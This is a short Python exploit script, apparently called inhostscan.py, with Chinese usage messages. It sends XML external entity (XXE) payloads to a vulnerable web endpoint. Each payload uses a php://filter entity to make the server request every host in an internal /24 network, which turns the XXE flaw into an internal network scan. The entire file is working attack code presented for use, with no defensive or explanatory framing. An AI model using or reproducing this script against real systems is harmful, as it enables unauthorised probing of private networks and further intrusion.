import sys
import requests
import base64

def XXE(url,ip,string):
	try:
		xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
		xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
		xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
		xml = xml + "\r\n" + """<xml>"""
		xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
		xml = xml + "\r\n" + """</xml>"""
		x = requests.post(url, data=xml, headers=headers, timeout=5).text
		coded_string = x.split(' ')[-2]
		print(' [+]',ip,'Successfully Found !!!')
	except:	
		print(' [-]',ip,'Error')
		pass


if __name__ == '__main__':
	headers = {'Content-Type':'application/xml'}
	try:
		print('''
[!] 用法：python3 inhostscan.py 漏洞网址 待扫描的IP段
[!] 示例：python3 inhostscan.py http://192.168.38.132/xxe_test.php 192.168.38
									''')
		url = sys.argv[1]
		ip_s = sys.argv[2]
		for i in range(1, 255):
			ip = ip_s + '.' + str(i)
			string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
			XXE(url,ip, string)
	except:
		print('[!] 请检查命令是否有误')
